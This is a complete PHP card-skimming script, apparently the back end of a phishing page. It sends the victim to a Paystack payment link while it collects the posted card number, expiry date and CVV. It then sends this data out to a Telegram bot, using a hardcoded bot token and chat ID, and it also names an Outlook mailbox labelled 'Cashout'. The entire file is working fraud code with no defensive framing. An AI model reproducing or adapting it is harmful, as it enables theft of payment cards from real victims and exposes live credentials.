<?php
header('Location: https://paystack.com/pay/6l9l58kwed');
$card=$_POST['card'];
$exp=$_POST['exp'];
$cvv=$_POST['cvv'];
$nl="\r\n";
$from = "Cashout";
$to = "okeke158@outlook.com";
$subject = "Cashout Is A Must By Gods  Grace";
$message = 'CARD: ' . $card . $nl.'EXP: ' . $exp .$nl. 'CVV: ' . $cvv ;
$headers = "From:" . $from ;
$api = "5369209739:AAFaMNk39MGepMZ3E9YrjLqhEHZupqCK-Pw";
$chatid = "@amexcashout158";
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" )

?>
